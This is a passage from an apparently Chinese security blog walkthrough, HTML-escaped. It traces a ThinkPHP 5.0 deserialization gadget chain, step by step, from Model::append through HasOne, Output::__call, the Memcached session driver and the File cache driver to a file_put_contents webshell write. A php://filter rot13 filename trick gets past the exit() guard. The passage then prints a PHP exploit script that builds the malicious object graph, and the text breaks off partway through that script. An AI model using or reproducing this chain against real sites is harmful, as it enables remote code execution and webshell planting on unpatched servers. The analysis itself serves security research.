&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;mf&#34;&gt;1.&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//$this-&amp;gt;append可控，后面把他设置为&amp;#39;getError&amp;#39;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;2.&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;method_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$relation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//$this-&amp;gt;append可控，导致$relation可控
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;3.&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;method_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$modelRelation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;getBindAttr&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//后面说
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;4.&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$bindAttr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//后面说
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;且不满足&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;elseif&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;strpos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中&lt;code&gt;$value&lt;/code&gt;是由这两行确定的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210417212035.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;需要满足&lt;code&gt;$modelRelation&lt;/code&gt;可控，经过查找，可以将&lt;code&gt;$relation&lt;/code&gt;设为&amp;rsquo;getError&#39;，&lt;code&gt;$modelRelation&lt;/code&gt;就变成了&lt;code&gt;$this-&amp;gt;getError()&lt;/code&gt;的返回值：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//$this-&amp;gt;error可控，他决定了$modelRelation的值
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;跟进getRelationDate:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210417222219.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;这里又给我们增加了条件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;5.最后传入的&lt;code&gt;$modelRelation&lt;/code&gt;需要是&lt;code&gt;Relation&lt;/code&gt;类型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;6.最后返回值&lt;code&gt;$values&lt;/code&gt;需要经过&lt;code&gt;if&lt;/code&gt;语句判断&lt;code&gt;$this-&amp;gt;parent &amp;amp;&amp;amp; !$modelRelation-&amp;gt;isSelfRelation() &amp;amp;&amp;amp; get_class($modelRelation-&amp;gt;getModel()) == get_class($this-&amp;gt;parent)&lt;/code&gt;才能让&lt;code&gt;$value&lt;/code&gt;可控&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这里有两条路，一种是符合if判断直接返回，另一种是不满足，进而调用getRelation方法&lt;/p&gt;
&lt;p&gt;具体可参考https://www.anquanke.com/post/id/219327&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;第二条路全局查找getRelation方法且为Relation子类的类，找到了HasOne（/thinkphp/library/think/model/relation/HasOne.php）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210418113603.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;第一条路，符合if判断之后&lt;code&gt;$value&lt;/code&gt;可控，得到返回值&lt;code&gt;$values&lt;/code&gt;之后代码跳出getRelationDate方法，运行至条件3处&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210418110614.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;if (method_exists($modelRelation, &#39;getBindAttr&#39;))&lt;/code&gt;，发现在HasOne的父类OneToOne里面是可控的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210417212650.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;那么条件4也得到了解决。代码执行到了&lt;code&gt;$item[$key] = $value ? $value-&amp;gt;getAttr($attr) : null&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;控制&lt;code&gt;$value&lt;/code&gt;就能调用&lt;code&gt;__call&lt;/code&gt;方法；&lt;/p&gt;
&lt;p&gt;之前我们有提到要RCE需要调用Request类的&lt;code&gt;__call&lt;/code&gt;方法，但是由于&lt;code&gt;self::$hook[$method]&lt;/code&gt;不可控,无法成功利用&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210418141551.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;于是我们可以寻找其他的方法，比如Output类的&lt;code&gt;__call&lt;/code&gt;方法&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210418143247.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;这里调用了block方法，跟进：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210418143440.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;继续跟进：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210418143521.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;疯狂跟进：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210418143650.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$this-&amp;gt;handle&lt;/code&gt;是可控的，继续全局搜索write，寻找可控的点，找到了/thinkphp/library/think/session/driver/Memcached.php&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210418143918.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;同样&lt;code&gt;$this-&amp;gt;handle&lt;/code&gt;可控，继续全局搜索set，找到thinkphp/library/think/cache/driver/File.php&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210418144434.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;可以&lt;code&gt;file_put_contents&lt;/code&gt;写shell，并且&lt;code&gt;$filename&lt;/code&gt;在getCacheKey方法当中是可控的，伪协议绕一下exit就可以了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210418145126.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;但是&lt;code&gt;$data&lt;/code&gt;比较麻烦，他从传入的&lt;code&gt;$value&lt;/code&gt;取值，&lt;code&gt;set&lt;/code&gt;方法中的参数来自先前调用的&lt;code&gt;write&lt;/code&gt;方法，&lt;code&gt;write&lt;/code&gt;之前在writeln的时候就传入了true，不可控。偷一张图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210418145636.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;继续跟进后面的setTagItem方法，我们可以看到它再次调用了set方法:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210418145844.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;且文件内容&lt;code&gt;$value&lt;/code&gt;通过&lt;code&gt;$name&lt;/code&gt;赋值(文件名)，所以我们可以在文件名上面下功夫，比如&lt;code&gt;php://filter/write=string.rot13/resource=./&amp;lt;?cuc cucvasb();?&amp;gt;&lt;/code&gt;这种&lt;/p&gt;
&lt;p&gt;exp，可以实现在Windows写文件（来自网络）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\process\pipes&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$files&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;files&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//$file =&amp;gt; /think/Model的子类new Pivot(); Model是抽象类
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;abstract&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$append&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$error&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$parent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$modelRelation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;parent&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;//$this-&amp;gt;parent=&amp;gt; think\console\Output;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;append&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;xxx&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;getError&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;     &lt;span class=&#34;c1&#34;&gt;//调用getError 返回this-&amp;gt;error
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;error&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$modelRelation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;               &lt;span class=&#34;c1&#34;&gt;// $this-&amp;gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&amp;gt;&amp;gt;HasOne
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\Model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Pivot&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$modelRelation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;parent&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$modelRelation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\model\relation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;HasOne&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;OneToOne&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;

    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\model\relation&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;abstract&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;OneToOne&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$selfRelation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$bindAttr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;selfRelation&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;query&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;//$query指向Query
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;bindAttr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;xxx&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// $value值，作为call函数引用的第二变量
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\db&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Query&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;model&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//$this-&amp;gt;model=&amp;gt; think\console\Output;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$handle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$styles&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$handle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;styles&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;getAttr&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;handle&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$handle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//$handle-&amp;gt;think\session\driver\Memcached
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\session\driver&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Memcached&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
